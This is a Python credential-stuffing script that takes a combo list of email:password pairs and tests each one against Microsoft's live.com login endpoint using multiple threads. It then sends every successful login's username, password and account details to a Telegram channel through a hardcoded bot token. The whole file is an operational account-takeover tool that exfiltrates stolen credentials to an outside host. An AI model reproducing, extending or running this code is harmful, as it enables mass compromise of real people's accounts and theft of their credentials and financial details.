import requests
import re
import json
from urllib.parse import unquote, quote
import threading
import queue
import sys
import os
import random
import time
from colorama import Fore, Style, init as colorama_init

# --- CONFIGURATION (PUT YOUR DETAILS HERE) ---
TOKEN = "7658189111:AAHv_UeDd1_iP1kzL3iDRu0Rxs40mFB2xSs"
CHANNEL_ID = "ThaniDrops"
VIDEO_URL = "https://t.me/ThaniDrops/3"

# --- Stats & Global State ---
stats = {
    "hits": 0,
    "bad": 0,
    "retries": 0,
    "two_factor": 0,
    "custom_unknown": 0,
    "checked": 0,
    "total_combos": 0,
    "proxy_errors": 0
}
anasStatusL = threading.Lock()
anasOutput = threading.Lock()

# Constants from original script
anasPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
anasBK = "1665024852"
anasUAID = "a5b22c26bc704002ac309462e8d061bb"
anasMaxPer = 10
anasTimeOut = 15

def send_telegram_notification(hit_data):
    """Sends hit details to a Telegram channel with an accompanying video."""
    if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
        return

    message = f"""
🔥 **NEW HIT FOUND!** 🔥

👤 **Account:** `{hit_data.get('USER')}:{hit_data.get('PASS')}`
💰 **Balance:** {hit_data.get('Balance', 'N/A')}
💳 **Card:** {hit_data.get('CardTypeLast4', 'N/A')}
📍 **Location:** {hit_data.get('City', 'N/A')}, {hit_data.get('Region', 'N/A')} {hit_data.get('Zipcode', 'N/A')}
👤 **Holder:** {hit_data.get('AccountHolderName', 'N/A')}

🎥 **Video Proof:** [Watch Here]({VIDEO_URL})

Checked By: @AgentThani
"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHANNEL_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": False
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        with anasOutput:
            print(f"Error sending to Telegram: {e}")

def anasxzer00(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty: variables[var_name] = ""
            return False
    except Exception:
        if create_empty: variables[var_name] = ""
        return False

def anasRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    for attempt in range(anasMaxPer + 1):
        try:
            response = session.request(method, url, timeout=anasTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError):
            if retries_counter_list: retries_counter_list[0] += 1
            raise
        except requests.exceptions.RequestException:
            if attempt < anasMaxPer:
                if retries_counter_list: retries_counter_list[0] += 1
                time.sleep(1)
                continue
            else: raise
    return None

def anasChkAccount(user_pass_line, proxy_dict_for_session):
    try:
        user, password = user_pass_line.split(':', 1)
    except ValueError:
        return "ERROR"
        
    variables = {'USER': user, 'PASS': password}
    account_retry_attempts = [0]
    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
    
    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(user)}&contextid=2CCDB02DC526CA71&bk={anasBK}&uaid={anasUAID}&pid=15216"
        payload = f"ps=2&PPFT={anasPPFT}&PPSX=PassportRN&NewUser=1&login={quote(user)}&loginfmt={quote(user)}&type=11&LoginOptions=1&passwd={quote(password)}"
        
        response = anasRetries(session, 'POST', url_login, "Login", account_retry_attempts, data=payload, allow_redirects=True)
        if not response: return "ERROR"
        
        if "access_token=" in response.url or any(c.name in ["ANON", "WLSSC"] for c in session.cookies):
            send_telegram_notification(variables)
            with anasOutput:
                print(Fore.GREEN + f"[HIT] {user}")
            return "HIT"
        else:
            with anasOutput:
                print(Fore.RED + f"[BAD] {user}")
            return "BAD"
    except Exception as e:
        with anasOutput:
            print(Fore.YELLOW + f"[ERROR] {user}: {e}")
        return "ERROR"

def worker(q):
    while True:
        line = q.get()
        if line is None: break
        anasChkAccount(line, None)
        q.task_done()

def main():
    colorama_init()
    if not os.path.exists("combo.txt"):
        print(Fore.RED + "Error: combo.txt not found!")
        return

    with open("combo.txt", "r") as f:
        lines = [l.strip() for l in f if ":" in l]
    
    if not lines:
        print(Fore.YELLOW + "No accounts found in combo.txt")
        return

    print(Fore.CYAN + f"Starting checker with {len(lines)} accounts...")
    
    q = queue.Queue()
    for l in lines: q.put(l)
    
    threads = []
    num_threads = min(len(lines), 10)
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(q,))
        t.start()
        threads.append(t)
    
    q.join()
    for _ in range(len(threads)): q.put(None)
    for t in threads: t.join()
    
    print(Fore.GREEN + "Checking complete. All hits sent to Telegram.")

if __name__ == "__main__":
    main()